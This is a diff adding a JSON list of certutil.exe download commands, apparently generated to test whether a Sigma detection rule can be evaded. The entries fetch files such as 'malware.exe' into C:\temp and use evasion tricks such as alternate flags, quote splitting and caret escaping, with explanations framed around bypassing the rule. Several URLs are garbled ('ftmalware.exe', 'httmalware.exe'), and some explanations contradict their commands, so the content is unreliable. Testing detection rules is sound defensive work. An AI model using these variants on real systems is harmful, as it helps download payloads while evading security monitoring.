@@ -1,0 +1,22 @@
+[
+  {
+    "output": "certutil.exe -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt",
+    "explanation": "This command uses the -verifyctl flag instead of -urlcache, which is another suspicious flag detected by the Sigma rule. It maintains the same structure and behavior but uses a different flag to potentially bypass the rule."
+  },
+  {
+    "output": "certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt",
+    "explanation": "This command uses short form flags and includes an output filename. It is a direct match for the Sigma rule and is not a bypass."
+  },
+  {
+    "output": "certutil.exe -urlcache -split -f ftmalware.exe C:\\temp\\malware.exe",
+    "explanation": "This command uses a non-http protocol (ftp) and a normalized path. It may not be detected by the Sigma rule if the rule is specifically looking for HTTP(S) in the command line."
+  },
+  {
+    "output": "certutil.exe -urlcache\" \"-split -f httmalware.exe C:\\temp\\malware.exe",
+    "explanation": "This command uses quotes to separate the flags, which is a safe mutation technique. It maintains the same functionality but may bypass the Sigma rule if it relies on exact string matching."
+  },
+  {
+    "output": "cmd.exe /c certutil.exe -url^cache -split -f httmalware.exe C:\\temp\\malware.exe",
+    "explanation": "This command uses an escape character (^) to bypass the Sigma rule if it does not account for escaped characters in the command line."
+  }
+]
